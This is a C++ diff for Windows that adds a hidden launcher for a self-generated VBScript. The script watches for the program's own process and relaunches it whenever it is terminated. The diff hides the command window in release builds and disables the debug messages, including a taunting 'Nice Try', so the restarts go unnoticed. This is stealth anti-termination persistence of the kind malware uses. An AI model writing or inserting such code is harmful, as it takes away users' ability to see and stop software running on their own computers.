@@ -1,6 +1,17 @@
 #include <stdio.h>
 #include <iostream>
 
+std::string startLayer() {
+	#define hide SW_HIDE 
+	#if _DEBUG
+		#define hide SW_SHOW 
+	#endif
+
+	LPTSTR cmdPath = _T("cmd.exe");
+	std::string cmdArgs = "cmd.exe /k start " + Helpers::ExeName() + ".vbs";
+	ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, hide);
+	return "";
+}
 std::string createLayer() {
 	Helpers::killProcessByName("wscript.exe");
 	STARTUPINFO si;
@@ -16,8 +27,6 @@ std::string createLayer() {
 
 	std::ofstream outfile(Helpers::ExeName() + ".vbs");
 	outfile << "Do" << std::endl;
-
-
 	outfile << "sComputerName = \".\"" << std::endl;
 	outfile << "Set objWMIService = GetObject(\"winmgmts:\\\\\" & sComputerName & \"\\root\\cimv2\")" << std::endl;
 	//outfile << "sQuery = \"SELECT * FROM Win32_Process WHERE Name LIKE '%"+ Helpers::ExeName() +"%'\"" << std::endl;
@@ -31,9 +40,9 @@ std::string createLayer() {
 	outfile << "For Each objItem In objItems" << std::endl;
 	outfile << "If objItem.Name = \"" + Helpers::ExeName() + ".exe\" Then" << std::endl; //text.exe
 	outfile << "found = \"true\"" << std::endl; //text.exe
-	#if _DEBUG
-		outfile << "WScript.Echo \"Process[Name:\" & objItem.Name & \"]\"" << std::endl; //text.exe
-	#endif
+	//#if _DEBUG
+	//	outfile << "WScript.Echo \"Process[Name:\" & objItem.Name & \"]\"" << std::endl; //text.exe
+	//#endif
 
 		outfile << "End If" << std::endl; //text.exe
 		//outfile << "End If" << std::endl; //text.exe
@@ -46,9 +55,9 @@ std::string createLayer() {
 		outfile << "objShell.Run(\"" + Helpers::ExePath() + "\")" << std::endl; //text.exe
 		outfile << "Set objShell = Nothing" << std::endl; //text.exe
 
-	#if _DEBUG
-		outfile << "WScript.Echo \"Nice Try\"" << std::endl; //text.exe
-	#endif
+	//#if _DEBUG
+	//	outfile << "WScript.Echo \"Nice Try\"" << std::endl; //text.exe
+	//#endif
 	outfile << "End If" << std::endl; //text.exe
 
 	outfile << "WScript.Sleep 1000" << std::endl; //text.exe
